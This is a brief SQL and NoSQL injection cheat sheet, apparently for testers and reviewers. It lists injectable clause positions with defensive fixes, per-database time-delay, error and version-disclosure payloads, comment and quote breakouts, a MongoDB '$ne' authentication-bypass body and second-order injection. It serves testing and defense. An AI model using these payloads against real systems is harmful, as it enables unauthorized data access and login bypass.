# SQLi cheat sheet (per-DB + tricky positions)

## Injection in non-value positions (often missed - attackers love these)
- `ORDER BY <col>`: cannot be parameterized -> must allowlist. Test `ORDER BY (CASE WHEN 1=1 THEN 1 ELSE 2 END)`.
- `LIMIT`/`OFFSET`: cast to int; test with `1; SELECT ...`.
- `LIKE '%<x>%'`: input may break out of the literal; also wildcard DoS.
- `IN (<list>)`: building the list by join is a classic concat sink; parameterize each element.
- Column/table name interpolation: allowlist only.

## Per-DB time-delay / error probes
| DB | Time-based | Error-based | Version |
|---|---|---|---|
| MySQL/MariaDB | `SLEEP(5)`, `BENCHMARK(5000000,MD5(1))` | `extractvalue(1,concat(0x7e,@@version))`, `updatexml` | `@@version`, `version()` |
| PostgreSQL | `pg_sleep(5)` | `CAST(version() AS int)` | `version()` |
| MSSQL | `WAITFOR DELAY '0:0:5'` | `CONVERT(int,@@version)` | `@@version` |
| Oracle | `dbms_pipe.receive_message(('a'),5)` | `CTXSYS.DRITHSX.SN(...)` | `banner FROM v$version` |
| SQLite | `randomblob(100000000)` (heavy) | `abs(...)` type errors | `sqlite_version()` |

## Comment styles / breakouts
- `--` (space or newline after in some DBs), `#` (MySQL), `/* */`, `;%00`.
- Quote breakouts: `'`, `"`, backtick (MySQL identifiers). Escape doubling `''`.

## NoSQL (MongoDB) operator injection
- JSON body `{"user":"admin","pass":{"$ne":null}}` -> auth bypass. Sinks: query objects built from
  `req.body` without type-checking; `$where` with a JS string. Filter: fields are cast to string / schema-validated.

## Second-order
Payload stored via endpoint A (e.g. profile name `x'--`), executed by endpoint B that builds SQL from the
stored value. Trace both writes and reads of the same column.
